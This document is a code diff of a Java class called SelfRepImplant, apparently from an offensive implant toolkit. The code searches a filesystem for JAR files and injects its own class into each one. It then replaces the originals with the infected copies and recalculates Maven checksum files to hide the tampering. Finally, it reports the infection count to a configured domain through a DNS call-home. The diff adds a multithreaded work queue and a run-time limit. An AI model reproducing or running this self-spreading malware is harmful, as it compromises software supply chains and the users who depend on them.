@@ -15,9 +15,7 @@ import java.security.SecureRandom;
 import java.text.DecimalFormat;
 import java.time.Duration;
 import java.util.*;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.concurrent.TimeUnit;
+import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.jar.JarFile;
 import java.util.logging.Handler;
@@ -41,7 +39,18 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
      */
     static volatile String CONF_IGNORED_PATHS;
 
+    /**
+     * The amount of threads to run concurrently (or in parallel).
+     * Set this to the estimated number of CPU cores expected at the target system.
+     */
     static volatile int CONF_THREADS = 16;
+
+    /**
+     * The maximum duration (measured in seconds) that this implant should run.
+     * This is a rough estimate. Only the actual JarPlanting will be taken into consideration.
+     * Any worker threads caught when the time is up will finnish their work and then terminate.
+     */
+    static volatile int CONF_MAX_DURATION_SEC = 20;
 
     /**
      * Domain to report home to.
@@ -118,90 +127,75 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             });
         }
 
-        Set<Path> jarsToImplant;
-        try {
-            jarsToImplant = findAllJars(CONF_LIMIT_PATH, CONF_IGNORED_PATHS);
-        } catch (Exception e) {
-            System.out.println("[!] Failed to find JARs.");
-            e.printStackTrace();
-            return;
-        }
-
         ImplantHandler implantHandler;
         try {
             implantHandler = ImplantHandlerImpl.findAndCreateFor(SelfRepImplant.class);
         } catch (ClassNotFoundException | ImplantException | IOException e) {
             System.out.println("[!] Cannot load oneself. Aborting.");
-            System.exit(1);
-            throw new RuntimeException("Unreachable");
+            throw new RuntimeException("Cannot load oneself");
         }
-
         System.out.println("[*] Implant: " + implantHandler.getImplantClassName());
 
-        long plantTick = System.nanoTime();
 
+        // Set up a work queue with several consumers.
+        BlockingQueue<Optional<Path>> workQueue = new LinkedBlockingQueue<>();
         ExecutorService plantingThreads = Executors.newFixedThreadPool(CONF_THREADS);
-        AtomicInteger numInfected = new AtomicInteger(0);
-        for (Path jarToImplant : jarsToImplant) {
+        AtomicInteger numJarsFound = new AtomicInteger(0);
+        AtomicInteger numSpiked = new AtomicInteger(0);
+        long plantTick = System.nanoTime();
+        for (int i = 0; i < CONF_THREADS; i++) {
+            // Misuse the Executor/Future paradigm so that we don't have to pool up Thread instances ourselves.
             plantingThreads.submit(() -> {
-                ClassInjector injector;
-                try {
-                    injector = ClassInjector.createLoadedWith(implantHandler);
-                } catch (ImplantException e) {
-                    // Future optimization: Have the ImplantHandler check whatever throws this exception.
-                    throw new RuntimeException(e);
-                }
-
-                JarFiddler jar;
-                try {
-                    jar = JarFiddler.buffer(jarToImplant);
-                } catch (IOException e) {
-                    System.out.println("[-] Failed to read JAR '" + jarToImplant + "'. Skipping.");
-                    return;
-                }
-
-                Path outputTempFile;
-                try {
-                    outputTempFile = createTempFileFor(jarToImplant);
-                } catch (IOException e) {
-                    System.out.println("[-] Failed to get a temp file for '" + jarToImplant + "'. Skipping.");
-                    return;
-                }
-
-                try {
-                    boolean didInfect = injector.injectInto(jar);
-                    if (didInfect) {
-                        jar.write(outputTempFile, StandardOpenOption.CREATE_NEW);   // Atomic operation, failing on collision
-                        System.out.println("[+] JarPlant '" + jarToImplant.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
-                        doTheSwitcharoo(jarToImplant, outputTempFile);
-                        numInfected.incrementAndGet();
-                        System.out.println("[+] Spiked JAR '" + jarToImplant + "'.");
-
-                        recalculateMavenChecksumFile(jarToImplant);
-                    } else {
-                        System.out.println("[!] JarPlant chose to _not_ infect '" + jarToImplant + "'.");
+                while (true) {
+                    Optional<Path> nextTask;
+                    try {
+                        nextTask = workQueue.take();
+                    } catch (InterruptedException e) {
+                        System.out.println("[ ] Got interrupted.");
+                        return;
                     }
-                } catch (FileAlreadyExistsException e) {
-                    System.out.println("[-] File '" + outputTempFile + "' already exist. Skipping to avoid problems.");
-                } catch (IOException e) {
-                    System.out.println("[-] Failed to spike JAR '" + jarToImplant + "' (" + e.getMessage() + ")");
-                    cleanUpTempFile(outputTempFile);
+
+                    if (nextTask.isEmpty()) {
+                        // This is the poison pill meaning there will be no more work.
+                        // Also pass it along so that all other threads will take it, too.
+                        workQueue.add(nextTask);
+                        return;
+                    }
+
+                    Path jarToSpike = nextTask.get();
+                    numJarsFound.incrementAndGet();
+
+                    try {
+                        if (jarPlant(implantHandler, jarToSpike)) {
+                            numSpiked.incrementAndGet();
+                        }
+                    } catch (IOException ignored) {
+                    }
                 }
             });
+        }
+
+        // Find all JAR files in the given path, adding them to workQueue as it finds them.
+        try {
+            findAllJars(CONF_LIMIT_PATH, CONF_IGNORED_PATHS, workQueue);
+        } catch (Exception e) {
+            System.out.println("[!] Failed to find JARs.");
+            throw new RuntimeException("Find to find JARs");
+        } finally {
+            // Send the poison pill to the work queue to signal that no more work will follow.
+            workQueue.add(Optional.empty());
         }
 
         // Wait for all threads to complete.
         shutdownAndWaitForThreads(plantingThreads);
 
         long plantTock = System.nanoTime();
-        System.out.println("[#] JarPlanting took " + Duration.ofNanos(plantTock - plantTick));
-
-        String successRatePercentage = getSuccessRatePercentage(numInfected.get(), jarsToImplant.size());
-        System.out.println("[*] Spiked " + numInfected + " out of " + jarsToImplant.size() + " (" + successRatePercentage + ") JARs.");
+        String successRatePercentage = getSuccessRatePercentage(numSpiked.get(), numJarsFound.get());
+        System.out.println("[*] Spiked " + numSpiked.get() + " out of " + numJarsFound.get() + " (" + successRatePercentage + ") JARs in " + Duration.ofNanos(plantTock - plantTick) + ".");
 
         if (CONF_DOMAIN != null) {
             dnsThreads.submit(() -> {
-                callHome(CONF_DOMAIN, "did-" + numInfected, id);
+                callHome(CONF_DOMAIN, "did-" + numSpiked, id);
             });
         }
 
@@ -209,20 +203,66 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         shutdownAndWaitForThreads(dnsThreads);
     }
 
+    private static boolean jarPlant(ImplantHandler implantHandler, Path jarToSpike) throws IOException {
+        ClassInjector injector;
+        try {
+            injector = ClassInjector.createLoadedWith(implantHandler);
+        } catch (ImplantException e) {
+            // Future improvement: Have the ImplantHandler check whatever throws this exception.
+            throw new RuntimeException(e);
+        }
+
+        JarFiddler jar;
+        try {
+            jar = JarFiddler.buffer(jarToSpike);
+        } catch (IOException e) {
+            System.out.println("[-] Failed to read JAR '" + jarToSpike + "'. Skipping.");
+            throw e;
+        }
+
+        Path outputTempFile;
+        try {
+            outputTempFile = createTempFileFor(jarToSpike);
+        } catch (IOException e) {
+            System.out.println("[-] Failed to get a temp file for '" + jarToSpike + "'. Skipping.");
+            throw e;
+        }
+
+        boolean didInfect = injector.injectInto(jar);
+        if (!didInfect) {
+            System.out.println("[!] JarPlant chose to _not_ infect '" + jarToSpike + "'.");
+            return false;
+        }
+
+        try {
+            jar.write(outputTempFile, StandardOpenOption.CREATE_NEW);   // Atomic operation, failing on collision.
+            System.out.println("[+] JarPlant '" + jarToSpike.getFileName() + "' -> '" + outputTempFile.getFileName() + "'.");
+            doTheSwitcharoo(jarToSpike, outputTempFile);
+            System.out.println("[+] Spiked JAR '" + jarToSpike + "'.");
+
+            recalculateMavenChecksumFile(jarToSpike);
+        } catch (FileAlreadyExistsException e) {
+            System.out.println("[-] File '" + outputTempFile + "' already exist. Skipping to avoid problems.");
+            throw e;
+        } catch (IOException e) {
+            System.out.println("[-] Failed to spike JAR '" + jarToSpike + "' (" + e.getMessage() + ")");
+            cleanUpTempFile(outputTempFile);
+            throw e;
+        }
+
+        return true;
+    }
+
     private static void shutdownAndWaitForThreads(ExecutorService threads) {
         threads.shutdown();
         try {
-            if (!threads.awaitTermination((long) CONF_THREADS * 10, TimeUnit.SECONDS)) {
+            if (!threads.awaitTermination(CONF_MAX_DURATION_SEC, TimeUnit.SECONDS)) {
                 System.out.println("[!] Some concurrent task(s) did not finnish!");
 
                 // Something is taking too long. Shutdown hard by interrupting all threads.
                 threads.shutdownNow();
                 if (!threads.awaitTermination(10, TimeUnit.SECONDS)) {
                     System.out.println("[!] Some concurrent task(s) had to be shut down hard!");
-                    threads.shutdownNow();
-                    if (!threads.awaitTermination(10, TimeUnit.SECONDS)) {
-                        // Blood will be spilled.
-                    }
                 }
             }
         } catch (InterruptedException ignored) {
@@ -277,11 +317,11 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
     }
 
-    public static Set<Path> findAllJars(String root) {
-        return findAllJars(root, null);
+    public static void findAllJars(String root, BlockingQueue<Optional<Path>> workQueue) {
+        findAllJars(root, null, workQueue);
     }
 
-    public static Set<Path> findAllJars(String root, String ignoreSpec) throws IllegalArgumentException {
+    public static void findAllJars(String root, String ignoreSpec, BlockingQueue<Optional<Path>> workQueue) throws IllegalArgumentException {
         root = expandPath(root);
 
         Path dir = Path.of(root);
@@ -305,10 +345,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
 
         // Recurse through the file structure
-        Set<Path> validJarFiles = new HashSet<>();
-        findAllJars(dir, validJarFiles, Collections.unmodifiableSet(ignorePaths));
-
-        return validJarFiles;
+        findAllJars(dir, Collections.unmodifiableSet(ignorePaths), workQueue);
     }
 
     // Java does not natively support the ~ shorthand path. Expand it manually.
@@ -325,7 +362,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     }
 
     // Recursive function
-    private static void findAllJars(Path dir, Set<Path> accumulator, Set<Path> ignoredPaths) {
+    private static void findAllJars(Path dir, Set<Path> ignoredPaths, Queue<Optional<Path>> workQueue) {
         if (ignoredPaths.contains(dir)) {
             return;
         }
@@ -357,11 +394,11 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
                 continue;
             }
 
-            accumulator.add(subPath);
+            workQueue.add(Optional.of(subPath));
         }
 
         for (Path subDir : subDirs) {
-            findAllJars(subDir, accumulator, ignoredPaths);
+            findAllJars(subDir, ignoredPaths, workQueue);
         }
     }
 
